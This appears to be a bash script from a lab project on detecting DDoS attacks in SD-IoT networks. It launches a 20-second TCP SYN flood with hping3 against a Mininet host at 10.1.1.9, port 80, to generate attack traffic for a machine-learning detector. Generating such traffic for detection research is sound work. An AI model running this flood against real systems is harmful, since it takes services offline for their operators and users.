#!/usr/bin/env bash
#
# =============================================================================
# Project : DDoS Attack Detection & Mitigation in SD-IoT Networks using ML
# Script  : syn_flood.sh
#
# Description:
#   Generates a TCP SYN Flood attack using hping3 against the victim host
#   in the Mininet SD-IoT topology.
#
# Target Host : 10.1.1.9
# Attack Type : TCP SYN Flood
#
# Requirements:
#   - hping3
#   - Root privileges
#
# Usage:
#   sudo ./syn_flood.sh
#
# NOTE:
#   Run only in a controlled Mininet or laboratory environment.
# =============================================================================

set -e

###############################################################################
# Configuration
###############################################################################

TARGET_IP="10.1.1.9"
TARGET_PORT=80
DURATION=20

###############################################################################
# Check hping3 Installation
###############################################################################

if ! command -v hping3 >/dev/null 2>&1; then
    echo "Error: hping3 is not installed."
    exit 1
fi

###############################################################################
# Display Attack Information
###############################################################################

echo "====================================================="
echo "            TCP SYN Flood Attack"
echo "====================================================="
echo "Target IP : $TARGET_IP"
echo "Port      : $TARGET_PORT"
echo "Duration  : ${DURATION} seconds"
echo "====================================================="

###############################################################################
# Launch Attack
###############################################################################

echo
echo "Launching TCP SYN Flood..."

sudo timeout "$DURATION" hping3 \
    -S \
    --flood \
    -p "$TARGET_PORT" \
    "$TARGET_IP"

###############################################################################
# Attack Completed
###############################################################################

echo
echo "====================================================="
echo "Attack completed successfully."
echo "====================================================="